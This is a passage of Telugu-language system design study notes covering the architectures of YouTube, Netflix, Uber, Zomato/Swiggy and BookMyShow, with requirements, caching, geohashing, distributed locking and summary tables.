- ఇది సెలబ్రిటీలకి (ఉదా: Elon Musk - 100M followers) బెస్ట్. ఎందుకంటే 100 మిలియన్ల మందికి పుష్ చేయడం చాలా కష్టం.

**Twitter Hybrid Approach:** సాధారణ యూజర్లకు **Push**, సెలబ్రిటీలకు **Pull** మోడల్ వాడతారు.

#### B. డేటాబేస్ స్ట్రాటజీ

- **SQL (PostgreSQL):** యూజర్ ప్రొఫైల్ మరియు రిలేషన్ షిప్స్ కోసం.
- **NoSQL (Cassandra/DynamoDB):** ట్వీట్స్ డేటా స్టోర్ చేయడానికి. ఎందుకంటే ఇవి భారీ స్థాయిలో మెసేజ్/ట్వీట్ డేటాని చాలా వేగంగా రైట్ చేయగలవు.
- **Redis:** టైమ్‌లైన్ క్యాషీ (Tweet IDs) కోసం.

---

### 4. ఆర్కిటెక్చర్ ఫ్లో

1. **Posting:** యూజర్ ట్వీట్ చేస్తాడు -> **Tweet Service** సేవ్ చేస్తుంది -> **Fan-out Service** కి పంపిస్తుంది.
2. **Fan-out Service:** \* ఫాలోవర్ల లిస్ట్ కోసం **Graph Service** ని అడుగుతుంది.

- ఫాలోవర్ల Redis టైమ్‌లైన్‌లను అప్‌డేట్ చేస్తుంది.

3. **Reading:** యూజర్ యాప్ ఓపెన్ చేస్తాడు -> **Timeline Service** -> **Redis (Timeline Cache)** నుండి ట్వీట్ ఐడిలను తెచ్చుకుంటుంది -> ఆ ఐడిలతో **Tweet Service** ద్వారా కంటెంట్‌ని తెచ్చుకుని ఫీడ్ చూపిస్తుంది.

---

### 5. Bottlenecks & Solutions

1. **The "Elon Musk" Problem (Celebrity Hotspots):** సెలబ్రిటీలు ట్వీట్ చేస్తే మిలియన్ల మందికి ఒకేసారి పుష్ చేయడం వల్ల సర్వర్ క్రాష్ అయ్యే అవకాశం ఉంది.

- **Solution:** సెలబ్రిటీ ట్వీట్స్‌ని పుష్ చేయకుండా, ఫాలోవర్లు టైమ్‌లైన్ రిఫ్రెష్ చేసినప్పుడు మాత్రమే ఆ ట్వీట్స్‌ని ఆటోమేటిక్‌గా "మెర్జ్" (Merge) చేస్తాం.

2. **Data Consistency:** రియల్ టైమ్‌లో టైమ్‌లైన్ అప్‌డేట్ అవ్వడం ముఖ్యం కాబట్టి **Kafka** వాడి ఆసింక్రోనస్ (Asynchronous) గా ఫ్యాన్-అవుట్ చేస్తాం.
3. **Caching Strategy:** కేవలం ట్వీట్ ఐడిలను మాత్రమే క్యాషీలో ఉంచుతాము (మెమరీ ఆదా అవుతుంది), ట్వీట్ కంటెంట్‌ని కాదు.

---

### Summary Architecture:

- **Storage:** Cassandra (Tweets) + PostgreSQL (Graph).
- **Speed:** Redis (Timeline IDs) + CDN (Media).
- **Async Processing:** Kafka (Fan-out jobs).

---

## YouTube

**YouTube** సిస్టమ్ డిజైన్ అనేది **"Video Streaming"** మరియు **"Massive Scale"** అనే రెండు అంశాల కలయిక. ఇది చాలా పెద్ద వ్యవస్థ, ఎందుకంటే మనం రోజుకు మిలియన్ల గంటల వీడియోలను ప్రాసెస్ చేయాలి, స్టోర్ చేయాలి మరియు ప్రపంచవ్యాప్తంగా ఉన్న యూజర్లకు ఎటువంటి బఫరింగ్ లేకుండా చూపించాలి.

దీనిని మనం 4 ప్రధాన భాగాలుగా విభజించి చూద్దాం:

---

### 1. Requirements (అవసరాలు)

- **Functional:** \* వీడియో అప్‌లోడ్ (Upload Video).
- వీడియో ప్రాసెసింగ్ (Transcoding - వేర్వేరు క్వాలిటీల్లోకి మార్చడం).
- వీడియో స్ట్రీమింగ్ (View Video).
- రికమెండేషన్ ఇంజిన్ (గంటల తరబడి చూసేందుకు).

- **Non-Functional:**
- **Low Latency:** వీడియో బఫరింగ్ అవ్వకూడదు.
- **Reliability:** వీడియో డిలీట్ అవ్వకూడదు, స్ట్రీమింగ్ ఆగకూడదు.
- **Scalability:** రోజుకు లక్షల వీడియోలు, కోట్లాది మంది వ్యూయర్స్.

---

### 2. High-Level Design & Workflow

1. **Upload Service:** వీడియోలు అప్‌లోడ్ అవ్వడానికి.
2. **Video Processing (Transcoding) Service:** ఒక వీడియోను అప్‌లోడ్ చేయగానే, దాన్ని 1080p, 720p, 480p, 360p... ఇలా అన్ని ఫార్మాట్లలోకి మార్చాలి (ఇది చాలా టైమ్ తీసుకునే పని).
3. **Storage (Blob Storage):** వీడియో ఫైల్స్ అన్నీ **Google Cloud Storage** లేదా **S3** లో దాచుకుంటాం.
4. **CDN (Content Delivery Network):** వీడియోను ప్రపంచవ్యాప్తంగా లోడ్ చేయడానికి ఇదే అతి ముఖ్యమైన భాగం.

---

### 3. Deep Dive (ముఖ్యమైన సవాళ్లు)

#### A. Transcoding & Adaptive Bitrate Streaming

యూజర్ ఇంటర్నెట్ స్పీడ్ ని బట్టి వీడియో క్వాలిటీ ఆటోమేటిక్ గా మారాలి. దీనినే **Adaptive Bitrate Streaming (ABR)** అంటారు.

- సర్వర్ వీడియోను చిన్న చిన్న **Chunks (ముక్కలు)** గా విభజిస్తుంది.
- యూజర్ ఇంటర్నెట్ స్లోగా ఉంటే చిన్న చిన్న ముక్కలు (360p), ఫాస్ట్‌గా ఉంటే పెద్ద ముక్కలు (1080p) పంపుతుంది. (దీని కోసం **HLS** లేదా **DASH** ప్రోటోకాల్స్ వాడతారు).

#### B. Fan-out vs Fan-in (Streaming)

వీడియో ఫైల్స్ చాలా పెద్దవి కాబట్టి, వాటిని ఒకే సర్వర్‌లో ఉంచలేం.

- **Storage:** వీడియోను **Chunks** గా విడగొట్టి, వేర్వేరు సర్వర్లలో (Distributed Storage) దాచుతాం.
- **CDN (Edge Locations):** వీడియో ముక్కలను యూజర్‌కి దగ్గరగా ఉన్న Edge Server లో క్యాష్ చేస్తాం. మీరు ఒక వీడియో చూస్తున్నప్పుడు, అది మీ దగ్గరలోని సర్వర్ నుండే వస్తుంది.

#### C. Database Strategy

- **Metadata DB (SQL):** వీడియో టైటిల్, డిస్క్రిప్షన్, లైక్స్, కామెంట్స్ కోసం.
- **NoSQL (Cassandra/Bigtable):** యూజర్ వ్యూ హిస్టరీ, అనలిటిక్స్ కోసం.
- **Redis:** పాపులర్ వీడియోల మెటాడేటా మరియు క్యాషింగ్ కోసం.

---

### 4. ఆర్కిటెక్చర్ ఫ్లో

1. **User Uploads:** వీడియో అప్‌లోడ్ అయ్యి **Object Storage** కి వెళ్తుంది.
2. **Processing:** **Kafka** ద్వారా **Transcoding Service** కి నోటిఫికేషన్ వెళ్తుంది. ఇది వీడియోను ముక్కలు చేసి వేర్వేరు క్వాలిటీల్లో మారుస్తుంది.
3. **Distribution:** ఫైనల్ ఫైల్స్ అన్నీ **CDN** కి పంపబడతాయి.
4. **Streaming:** యూజర్ వీడియో క్లిక్ చేయగానే, **API Gateway** దగ్గరలోని CDN సర్వర్ అడ్రస్ ఇస్తుంది. వీడియో అక్కడి నుండి ప్లే అవుతుంది.

---

### 5. Bottlenecks & Solutions

1. **Slow Internet:** పైన చెప్పిన **Adaptive Bitrate Streaming** ద్వారా పరిష్కరిస్తాం.
2. **Data Growth:** ప్రతిరోజూ పెరిగే వీడియోల డేటాను మేనేజ్ చేయడానికి **Cold Storage** (పాత వీడియోలు - ఇవి తక్కువ ఖర్చుతో కూడిన సర్వర్లలో ఉంటాయి) మరియు **Hot Storage** (కొత్త/పాపులర్ వీడియోలు) అని విడదీస్తాం.
3. **Recommendation Engine:** యూజర్ ఇష్టాలను బట్టి వీడియోలను చూపించడానికి **Machine Learning Models** ని వాడతాం. ఇవి యూజర్ చూసే హిస్టరీని (Redis/Bigtable) విశ్లేషిస్తాయి.

---

### Summary Architecture:

- **Storage:** Object Storage (Videos) + SQL/NoSQL (Metadata).
- **Processing:** Transcoding Service (Parallel Workers + Kafka).
- **Delivery:** CDN (Edge Locations).
- **Speed:** Adaptive Bitrate Streaming.

## YouTube ని డిజైన్ చేయడం అంటే ఒక విధంగా "Netflix" ని డిజైన్ చేసినట్టే, కానీ ఇక్కడ అప్‌లోడింగ్ ఫీచర్ ఇంకా ఎక్కువగా ఉంటుంది.

## Netflix

**Netflix** డిజైన్ చేయడం అనేది సిస్టమ్ డిజైన్‌లో ఒక **"Masterclass"**. ఇక్కడ సవాలు కేవలం వీడియోను స్ట్రీమింగ్ చేయడం మాత్రమే కాదు, ప్రపంచవ్యాప్తంగా ఉన్న వేల కోట్ల మందికి **"Zero Buffering"** తో కంటెంట్ అందించడం.

దీనిని మనం ఇండస్ట్రీలో వాడే **"Media-as-a-Service"** ఆర్కిటెక్చర్ తో అర్థం చేసుకుందాం.

---

### 1. Requirements (అవసరాలు)

- **Functional:** \* భారీ లైబ్రరీ నుండి వీడియోను సెలెక్ట్ చేయడం.
- లో-బ్యాండ్‌విడ్త్ లో కూడా హై-క్వాలిటీ వీడియో చూడటం (ABR).
- పర్సనలైజ్డ్ రికమెండేషన్స్ (Recommendations).

- **Non-Functional:**
- **High Throughput:** మిలియన్ల మంది ఏకకాలంలో స్ట్రీమింగ్ చేస్తారు.
- **Zero Downtime:** ఏ సర్వర్ ఫెయిల్ అయినా స్ట్రీమింగ్ ఆగకూడదు.
- **Global Availability:** ప్రపంచవ్యాప్తంగా ఫాస్ట్ యాక్సెస్.

---

### 2. Deep Dive (Netflix ప్రత్యేకతలు)

#### A. Content Delivery (The Core Secret)

Netflix కేవలం CDN మీద ఆధారపడదు. వాళ్ళు సొంతంగా **"Open Connect"** అనే నెట్‌వర్క్‌ను నిర్మించుకున్నారు.

- **Open Connect Appliances (OCAs):** నెట్‌ఫ్లిక్స్ తన సొంత సర్వర్లను ప్రపంచవ్యాప్తంగా ఉన్న ISPల (Internet Service Providers - ఉదా: ACT, Jio, Airtel) డేటా సెంటర్లలో ఉంచుతుంది.
- **లాభం:** డేటా నెట్‌ఫ్లిక్స్ సర్వర్ నుండి రాదు, నేరుగా మీ ఇంటర్నెట్ ప్రొవైడర్ (ISP) దగ్గర ఉన్న సర్వర్ నుండే వస్తుంది. దీనివల్ల వేగం చాలా ఎక్కువగా ఉంటుంది.

#### B. Transcoding Pipeline

ఒక సినిమాను నెట్‌ఫ్లిక్స్ సర్వర్‌కి పంపినప్పుడు:

- **Frame-by-frame processing:** సినిమాను వేల ముక్కలుగా చేస్తారు.
- **Multi-encoding:** 500+ ఫార్మాట్లలో ఎన్‌కోడ్ చేస్తారు (డివైస్-ని బట్టి - TV, Mobile, Laptop, 4K, HDR).
- దీన్ని ప్రాసెస్ చేయడానికి Netflix వందల కొద్దీ క్లౌడ్ (AWS) ఇన్స్టాన్స్‌లను వాడి **Parallel Processing** చేస్తుంది.

#### C. Personalization & Recommendation Engine

ఇది Netflix లోనే అత్యంత తెలివైన భాగం.

- **Data Collection:** యూజర్ ఏ వీడియోని ఎక్కడ ఆపాడు, ఏది స్కిప్ చేశాడు, ఏ జోనర్ ఎక్కువగా చూస్తున్నాడు అనేది సేకరిస్తుంది.
- **ML Models:** ఈ డేటాను **Spark/Flink** లాంటి బిగ్ డేటా టూల్స్ ద్వారా ప్రాసెస్ చేసి, యూజర్‌కి నచ్చే వీడియోలను హోమ్ పేజీలో చూపిస్తుంది.

---

### 3. Architecture Flow (హై-లెవల్)

1. **Client (Mobile/TV):** కనెక్ట్ అవ్వగానే **API Gateway** నుండి వీడియో మెటాడేటా తీసుకుంటుంది.
2. **Recommendation Service:** ఇది యూజర్ ప్రొఫైల్ ని బట్టి టాప్ 10 రికమెండేషన్స్ ఇస్తుంది.
3. **Playback Service:** యూజర్ వీడియో క్లిక్ చేయగానే, అతని లొకేషన్ మరియు ఇంటర్నెట్ స్పీడ్ ని బట్టి ఏ **Open Connect Appliance (OCA)** నుండి డేటా తక్కువ టైమ్ లో వస్తుందో ఆ అడ్రస్ ఇస్తుంది.
4. **Streaming:** వీడియో డేటా నేరుగా ఆ **OCA** నుండి యూజర్ డివైస్ కి వస్తుంది.

---

### 4. Bottlenecks & Solutions

1. **Device Diversity:** ఒక్కో డివైస్ కి ఒక్కో ప్లేయర్ ఉంటుంది. నెట్‌ఫ్లిక్స్ అన్నింటికీ సపోర్ట్ చేసేలా మల్టిపుల్ వీడియో ఫార్మాట్లను స్టోర్ చేస్తుంది.
2. **Traffic Spikes:** ఒక కొత్త వెబ్ సిరీస్ రిలీజ్ అయినప్పుడు ట్రాఫిక్ ఒక్కసారిగా పెరుగుతుంది. దీని కోసం **Auto-scaling** ని వాడుతారు, అలాగే **Open Connect** ఉండటం వల్ల లోకల్ ISP సర్వర్ల మీద భారం పడుతుంది తప్ప మెయిన్ సర్వర్ మీద కాదు.
3. **Consistency:** "నేను ఇక్కడ ఆపాను, వేరే డివైస్ లో అక్కడి నుండే మొదలవ్వాలి". దీని కోసం **Redis** లో యూజర్ యొక్క `Watch_Progress` ని ఎప్పటికప్పుడు అప్‌డేట్ చేస్తారు.

---

### 5. Summary Architecture Table

| భాగం                | టెక్నాలజీ                 | పని                                    |
| ------------------- | ------------------------- | -------------------------------------- |
| **Streaming**       | Open Connect (OCAs)       | యూజర్‌కి దగ్గరగా వీడియోని అందించడం.    |
| **Data Processing** | AWS / Spark               | వీడియో ఎన్‌కోడింగ్ & అనలిటిక్స్.       |
| **Metadata**        | Cassandra                 | యూజర్ ప్రొఫైల్, వాచ్ హిస్టరీ స్టోరేజ్. |
| **Search/Rec**      | Elasticsearch / ML Models | సెర్చ్ రిజల్ట్స్ & పర్సనలైజేషన్.       |

---

## Uber

**Uber (Ride-Sharing System)** ని డిజైన్ చేయడం అంటే **Geospatial (భౌగోళిక)** డేటా, **Real-time Updates**, మరియు **High Concurrency** ని హ్యాండిల్ చేయడం. ఇది కేవలం ఒక బుకింగ్ యాప్ మాత్రమే కాదు, ఇది ఒక క్లిష్టమైన టైమ్-సెన్సిటివ్ ప్లాట్‌ఫారమ్.

దీనిని మనం 4 కీలక విభాగాల్లో చూద్దాం:

---

### 1. Requirements (అవసరాలు)

- **Functional:** \* యూజర్ తన దగ్గరలో ఉన్న డ్రైవర్లను చూడాలి (Ride Request).
- డ్రైవర్ రిక్వెస్ట్ ని యాక్సెప్ట్ చేయాలి.
- రైడ్ లైవ్ ట్రాకింగ్ (Live location tracking).
- రైడ్ ముగిసాక పేమెంట్ మరియు రేటింగ్.

- **Non-Functional:**
- **Low Latency:** డ్రైవర్ లొకేషన్ సెకన్లలో అప్‌డేట్ అవ్వాలి.
- **High Availability:** రైడ్ బుకింగ్ ఫెయిల్ అవ్వకూడదు.
- **Consistency:** ఒకే రైడ్‌ను ఇద్దరు డ్రైవర్లు తీసుకోకూడదు (Race condition).

---

### 2. High-Level Design (ముఖ్య భాగాలు)

1. **Driver Location Service:** డ్రైవర్ల GPS లొకేషన్ ఎప్పటికప్పుడు అప్‌డేట్ చేయడానికి.
2. **Trip Management Service:** రైడ్ క్రియేషన్, యాక్సెప్టెన్స్ కోసం.
3. **Matching/Dispatch Service:** యూజర్‌కి దగ్గరగా ఉన్న డ్రైవర్‌ను వెతకడానికి.
4. **Notification Service:** డ్రైవర్ మరియు యూజర్‌కు అప్‌డేట్స్ పంపడానికి.

---

### 3. Deep Dive (ముఖ్యమైన సవాళ్లు)

#### A. లొకేషన్ ఎలా చూస్తాం? (Geospatial Indexing)

కోట్లాది మంది డ్రైవర్లు ఉంటారు. "నాకు 5 కిలోమీటర్ల దూరంలో ఉన్న డ్రైవర్ కావాలి" అని డేటాబేస్ ని క్వెరీ చేయడం చాలా కష్టం. దీనికోసం **Geohashing** లేదా **Quadtrees** వాడతాము.

- **Geohashing:** భూమిని గ్రిడ్లుగా విభజించి, ప్రతి ఏరియాకి ఒక కోడ్ (Hash) ఇస్తాం. యూజర్ ఏ హ్యాష్ లో ఉన్నాడో, ఆ ఏరియాలోని డ్రైవర్లను మాత్రమే చూపిస్తాం.

#### B. రైడ్ మ్యాచ్ చేయడం ఎలా? (Matching/Dispatch)

- యూజర్ రిక్వెస్ట్ పంపగానే **Matching Service** ఆక్టివేట్ అవుతుంది.
- ఇది Redis లోని డ్రైవర్ లొకేషన్స్ (Geospatial Index) ని చెక్ చేసి, దగ్గరలో ఉన్న డ్రైవర్లకి ఒక **Push Notification** పంపుతుంది.
- **Race Condition:** ఒకే రిక్వెస్ట్ ని ఇద్దరు డ్రైవర్లు క్లిక్ చేయకుండా, **Distributed Lock** లేదా **Atomic Operation** ద్వారా ఒకరికి మాత్రమే రైడ్ కేటాయించబడుతుంది.

#### C. లైవ్ ట్రాకింగ్ (WebSockets)

- డ్రైవర్ తన GPS కోఆర్డినేట్స్ ని ప్రతి 2-3 సెకన్లకు సర్వర్‌కు పంపుతాడు.
- ఈ అప్‌డేట్స్ **WebSocket** ద్వారా యూజర్ యాప్‌కి రియల్ టైమ్ లో వెళ్తాయి.
- **Performance:** ప్రతి అప్‌డేట్ ని డేటాబేస్ లో సేవ్ చేయకూడదు (చాలా భారం అవుతుంది). దీన్ని కేవలం **Redis (In-memory)** లో మాత్రమే ఉంచుతాము. కేవలం రైడ్ హిస్టరీ కోసం మాత్రమే డేటాబేస్ లో సేవ్ చేస్తాము.

---

### 4. ఆర్కిటెక్చర్ ఫ్లో

1. **Driver:** GPS అప్‌డేట్స్ ప్రతి 3 సెకన్లకు -> **Location Service (Redis)**.
2. **User:** "Ride Request" -> **Matching Service**.
3. **Matching Service:** Redis లోని సమీప డ్రైవర్లను ఫిల్టర్ చేసి -> **Notification Service** -> డ్రైవర్ యాప్ కి పంపుతుంది.
4. **Trip:** డ్రైవర్ యాక్సెప్ట్ చేయగానే, రైడ్ స్టార్ట్ అవుతుంది -> **Trip Service** ఆ రైడ్ ని ట్రాక్ చేస్తుంది.

---

### 5. Bottlenecks & Solutions

1. **High Concurrency:** ఒకే ఏరియాలో వేల మంది యూజర్లు, డ్రైవర్లు ఉండవచ్చు. దీనికోసం **Sharding** వాడతాము (Geographical Sharding - ఒక్కో ఏరియాకి ఒక్కో సర్వర్).
2. **Consistency:** రైడ్ అప్‌డేట్స్ కోసం **Kafka** వాడతాము. డ్రైవర్ యాక్సెప్ట్ చేసిందా లేదా అనేది క్యూలో ప్రాసెస్ అవుతుంది.
3. **Data Storage:** రైడ్ హిస్టరీ కోసం **NoSQL (Cassandra)** వాడతాము, ఎందుకంటే ఇది భారీ స్థాయిలో డేటాను రాయగలదు.

---

### Summary Architecture Table

| భాగం                  | టెక్నాలజీ       | పని                              |
| --------------------- | --------------- | -------------------------------- |
| **Location Tracking** | Redis (Geohash) | డ్రైవర్ల లైవ్ లొకేషన్ స్టోరేజ్.  |
| **Communication**     | WebSockets      | యూజర్-డ్రైవర్ లైవ్ కమ్యూనికేషన్. |
| **Data Storage**      | Cassandra       | రైడ్ హిస్టరీ, అనలిటిక్స్.        |
| **Matching**          | Redis + Kafka   | డ్రైవర్-యూజర్ పేరింగ్.           |

---

## Zomato/Swiggy

**Zomato/Swiggy** వంటి ఫుడ్ డెలివరీ సిస్టమ్స్‌ను డిజైన్ చేయడం అనేది చాలా ఆసక్తికరమైన సవాలు. ఇందులో **Uber (Ride-sharing)** మరియు **E-commerce (Marketplace)** రెండింటి కలయిక ఉంటుంది.

దీనిని మనం **"Hyperlocal Marketplace"** ఆర్కిటెక్చర్‌గా పరిగణిస్తాం. దీనిని 4 ముఖ్యమైన భాగాలుగా విడదీద్దాం:

---

### 1. Requirements (అవసరాలు)

- **Functional:** \* రెస్టారెంట్ల లిస్ట్ మరియు మెనూ చూపించడం (Discovery).
- ఆర్డర్ ప్లేస్ చేయడం, పేమెంట్ (Ordering).
- రెస్టారెంట్ ప్రిపరేషన్, డెలివరీ బాయ్ ట్రాకింగ్ (Lifecycle).

- **Non-Functional:**
- **High Concurrency:** లంచ్/డిన్నర్ టైమ్‌లో విపరీతమైన ట్రాఫిక్.
- **Consistency:** ఒక ఆర్డర్‌ని ఒక డెలివరీ పార్టనర్ మాత్రమే తీసుకోగలగాలి.
- **Latency:** లొకేషన్ బేస్డ్ సెర్చ్ చాలా ఫాస్ట్ గా ఉండాలి.

---

### 2. High-Level Design (ముఖ్య భాగాలు)

1. **Discovery Service:** యూజర్ లొకేషన్ బట్టి దగ్గర్లోని రెస్టారెంట్లను చూపించడం. (ఇక్కడ **Geohashing** వాడాలి).
2. **Order Service:** ఆర్డర్ లైఫ్-సైకిల్ (Pending -> Accepted -> Cooking -> Picked -> Delivered) ట్రాక్ చేయడం.
3. **Inventory Service:** రెస్టారెంట్ మెనూ, ప్రైస్, స్టాక్ అప్‌డేట్స్.
4. **Delivery/Dispatch Service:** Uber లాగానే, దగ్గర్లోని డెలివరీ బాయ్ ని వెతకడం.

---

### 3. Deep Dive (ముఖ్యమైన సవాళ్లు)

#### A. Geofencing & Discovery

యూజర్ ఒక లొకేషన్ ఇచ్చాక, ఆ పరిధిలో ఉన్న రెస్టారెంట్లను మాత్రమే చూపించాలి.

- **Geohashing:** యూజర్ లొకేషన్‌ను ఒక Geohash గా మారుస్తాం. ఆ హ్యాష్ పరిధిలో ఉన్న రెస్టారెంట్లను **Elasticsearch** (సెర్చ్ కోసం) లేదా **Redis** (ఫాస్ట్ యాక్సెస్ కోసం) ద్వారా తెచ్చుకుంటాం.

#### B. The Order Lifecycle (Distributed Transactions)

ఇది ఈ సిస్టమ్‌లో అత్యంత క్లిష్టమైన భాగం. ఒక ఆర్డర్ ప్లేస్ అయినప్పుడు మూడు చోట్ల మార్పులు జరగాలి:

1. **User Side:** పేమెంట్ కట్ అవ్వాలి.
2. **Restaurant Side:** ఆర్డర్ నోటిఫికేషన్ వెళ్లాలి.
3. **Delivery Side:** దగ్గర్లోని డెలివరీ బాయ్ కి నోటిఫికేషన్ వెళ్లాలి.

- **Saga Pattern:** ఒకవేళ రెస్టారెంట్ ఆర్డర్ రిజెక్ట్ చేస్తే (ఉదా: ఐటమ్ లేదు), అప్పుడు వెంటనే పేమెంట్ రీఫండ్ అయ్యేలా, డెలివరీ బాయ్ సెర్చ్ ఆగిపోయేలా మనం **Saga Pattern** వాడాలి.

#### C. Inventory Management (Race Conditions)

ఒక ఐటమ్ (ఉదా: బిర్యానీ) చివరగా ఒకటి మాత్రమే ఉంది. ఇద్దరు యూజర్లు ఒకేసారి ఆర్డర్ చేస్తే?

- **Distributed Locking (Redis):** ఆర్డర్ చేసే ముందు ఆ ఐటమ్ మీద లాక్ వేయాలి. ఎవరి పేమెంట్ అయితే సక్సెస్ అవుతుందో, వారికే ఆ లాక్ పడుతుంది.

---

### 4. ఆర్కిటెక్చర్ ఫ్లో

1. **Browse:** యూజర్ యాప్ ఓపెన్ చేయగానే **Discovery Service** (Geohash ద్వారా) దగ్గర్లోని రెస్టారెంట్లను చూపిస్తుంది.
2. **Order:** యూజర్ ఆర్డర్ ఇవ్వగానే **Order Service** దాన్ని క్రియేట్ చేస్తుంది.
3. **Workflow:** **Kafka** ద్వారా ఆర్డర్ వివరాలు రెస్టారెంట్‌కు మరియు **Dispatch Service** కి వెళ్తాయి.
4. **Delivery:** డెలివరీ బాయ్ లొకేషన్ **WebSocket** ద్వారా లైవ్ ట్రాక్ అవుతుంది.

---

### 5. Bottlenecks & Solutions

1. **Flash Sales/Discounts:** 50% ఆఫ్ ఉన్నప్పుడు ట్రాఫిక్ ఒక్కసారిగా పెరుగుతుంది. దీని కోసం **Rate Limiting** వాడాలి (ఒక సెకనుకి ఇన్ని ఆర్డర్లు మాత్రమే అని).
2. **Data Consistency:** రెస్టారెంట్ యాప్‌లో మెనూ మారితే, వెంటనే కస్టమర్ యాప్‌లో కనిపించాలి. దీనికి **CDC (Change Data Capture)** - డేటాబేస్ లో మార్పు జరగగానే క్యూ ద్వారా అందరికీ అప్‌డేట్ వెళ్తుంది.
3. **Payment Integrity:** పేమెంట్ ఫెయిల్ అయితే, ఆర్డర్ క్రియేట్ అవ్వకూడదు. దీనికి **Outbox Pattern** వాడతాము.

---

### Summary Architecture Table

| భాగం                 | టెక్నాలజీ        | పని                                |
| -------------------- | ---------------- | ---------------------------------- |
| **Search/Discovery** | Elasticsearch    | లొకేషన్ బేస్డ్ రెస్టారెంట్ సెర్చ్. |
| **Workflow**         | Kafka / RabbitMQ | ఆర్డర్ స్టేటస్ అప్‌డేట్స్.         |
| **Order History**    | Cassandra        | కోట్లాది ఆర్డర్ల డేటా స్టోరేజ్.    |
| **Live Tracking**    | WebSockets       | డెలివరీ బాయ్ లొకేషన్.              |

---

## BookMyShow

**BookMyShow** (టికెట్ బుకింగ్ సిస్టమ్) డిజైన్ చేయడం అనేది సిస్టమ్ డిజైన్‌లో ఒక క్లాసిక్ ప్రాబ్లం. దీనిని **"Inventory Management"** మరియు **"Concurrency Control"** ప్రాబ్లమ్‌గా పరిగణిస్తారు. ఎందుకంటే, ఒకే సీటును పదిమంది ఒకేసారి బుక్ చేసుకోవడానికి ట్రై చేసినప్పుడు, ఎవరికి దక్కాలి? ఎలా మేనేజ్ చేయాలి? అనేది ఇక్కడ ముఖ్యం.

దీనిని మనం 4 ముఖ్యమైన భాగాలుగా విడదీద్దాం:

---

### 1. Requirements (అవసరాలు)

- **Functional:** \* సినిమాలు మరియు థియేటర్ల లిస్ట్ చూడటం.
- సీట్ మ్యాప్ చూపించడం (ఏ సీట్లు ఖాళీగా ఉన్నాయి).
- సీట్ బుక్ చేసుకోవడం (Blocking & Booking).
- పేమెంట్ ప్రాసెస్.

- **Non-Functional:**
- **High Concurrency:** ఒక పెద్ద సినిమా రిలీజ్ అయినప్పుడు లక్షల మంది ఒకేసారి యాప్ ఓపెన్ చేస్తారు.
- **Data Consistency:** ఒక సీటు ఒకేసారి ఒకరికి మాత్రమే దక్కాలి (No double booking).
- **Low Latency:** సీట్ మ్యాప్ లోడ్ అవ్వడం వేగంగా ఉండాలి.

---

### 2. Deep Dive (ముఖ్యమైన సవాళ్లు)

#### A. The "Seat Blocking" Problem

సీట్ బుకింగ్ ప్రాసెస్ లో రెండు స్టేజ్ లు ఉంటాయి:

1. **Blocking (Locking):** యూజర్ సీటును క్లిక్ చేయగానే, అది 5-10 నిమిషాల పాటు "Block" అవ్వాలి (ఇంకెవరూ బుక్ చేయకుండా).
2. **Booking (Confirmation):** పేమెంట్ సక్సెస్ అయ్యాక సీటును "Sold" గా మార్చాలి.

**ఇక్కడ కష్టమేంటంటే:** వందల మంది ఒకే సీటు మీద క్లిక్ చేస్తే?

- **Solution:** మనం **Distributed Lock** (Redis) వాడాలి. సీటును క్లిక్ చేయగానే, Redis లో ఆ సీటు ఐడికి ఒక తాత్కాలిక లాక్ పడుతుంది.

#### B. Availability (Seat Map)

- థియేటర్ లో సీట్లు తక్కువగా ఉంటాయి కానీ, వ్యూయర్స్ లక్షల్లో ఉంటారు. ప్రతి యూజర్ రిఫ్రెష్ చేసినప్పుడు డేటాబేస్ ని అడగకూడదు.
- **Solution:** సీట్ మ్యాప్ స్టేటస్ (Available/Blocked/Sold) ని **Redis** లో ఉంచాలి. యూజర్ సీట్ మ్యాప్ ఓపెన్ చేసినప్పుడు, అది నేరుగా Redis నుండే లోడ్ అవుతుంది.

#### C. Database Strategy

- **SQL (PostgreSQL):** సీట్ల వివరాలు, థియేటర్లు, సినిమాల వంటి రిలేషనల్ డేటా కోసం.
- **Redis:** సీట్ల రియల్-టైమ్ స్టేటస్ మరియు లాకింగ్ కోసం (చాలా వేగంగా ఉంటుంది).

---

### 3. ఆర్కిటెక్చర్ ఫ్లో

1. **Browse:** యూజర్ సినిమా సెలెక్ట్ చేస్తాడు -> **Discovery Service** (Redis నుండి) సీట్ల మ్యాప్ చూపిస్తుంది.
2. **Lock/Block:** యూజర్ సీటు సెలెక్ట్ చేయగానే -> **Booking Service** Redis లో ఆ సీటుకి "Pending" లాక్ పెడుతుంది.
3. **Payment:** పేమెంట్ సర్వీస్ కి వెళ్తుంది.
4. **Confirm:** పేమెంట్ సక్సెస్ అవ్వగానే -> **Booking Service** Redis లో సీటును "Sold" కి మారుస్తుంది + డేటాబేస్ లో పర్మనెంట్ ఎంట్రీ వేస్తుంది.

---

### 4. Bottlenecks & Solutions

1. **Double Booking:** ఇద్దరు యూజర్లు ఒకే సెకనులో క్లిక్ చేస్తే?

- **Database Constraint:** సీట్ టేబుల్ లో `UNIQUE (show_id, seat_id)` మరియు `status` వాడాలి. ఒకవేళ లాక్ ఫెయిల్ అయినా, డేటాబేస్ ఆ ట్రాన్సాక్షన్‌ని రిజెక్ట్ చేస్తుంది.

2. **Concurrency Handling:** బుకింగ్స్ ఎక్కువైనప్పుడు **Message Queue (Kafka)** వాడాలి. ఆర్డర్లను క్యూలో పెట్టి, ఒకటి తర్వాత ఒకటి ప్రాసెస్ చేస్తే సిస్టమ్ క్రాష్ అవ్వదు.
3. **Expired Bookings:** యూజర్ 5 నిమిషాల్లో పేమెంట్ చేయకపోతే?

- **Solution:** **TTL (Time To Live)** - Redis లో సీటు కి పెట్టిన లాక్ 5 నిమిషాల తర్వాత ఆటోమేటిక్ గా ఎక్స్‌పైర్ అయ్యేలా చేయాలి. అలా కాగానే ఆ సీటు మళ్ళీ అందరికీ "Available" అయిపోతుంది.

---

### Summary Architecture Table

| భాగం                 | టెక్నాలజీ                | పని                                   |
| -------------------- | ------------------------ | ------------------------------------- |
| **Seat Map**         | Redis                    | సీట్ల స్టేటస్ రియల్ టైమ్ లో చూపించడం. |
| **Locking**          | Redis (Distributed Lock) | Double booking అవ్వకుండా ఆపడం.        |
| **Transactions**     | PostgreSQL (ACID)        | కచ్చితమైన బుకింగ్ రికార్డ్స్.         |
| **Traffic Handling** | Kafka                    | బుకింగ్ రిక్వెస్టులను క్యూ చేయడం.     |

---

## Payment Gateway

